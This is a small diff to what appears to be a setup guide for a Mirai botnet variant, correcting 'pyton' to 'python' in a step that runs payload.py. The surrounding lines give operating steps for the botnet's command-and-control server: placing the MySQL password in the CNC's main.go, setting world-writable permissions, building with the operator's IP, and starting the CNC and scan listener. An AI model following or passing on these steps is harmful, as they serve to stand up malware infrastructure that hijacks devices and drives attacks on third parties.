@@ -115,7 +115,7 @@ NOW PUT THE MYSQL PASSWORD IN THE main.go OF THE CNC.
 cd ~/
 chmod 0777 * -R
 sh build.sh YOUR IP
-pyton payload.py //if your mirai variant has it, if doesnt find in some archive what has and edit to your bins
+python payload.py //if your mirai variant has it, if doesnt find in some archive what has and edit to your bins
 
 Now your mirai is setup you just need to start the cnc and the scanListen
 
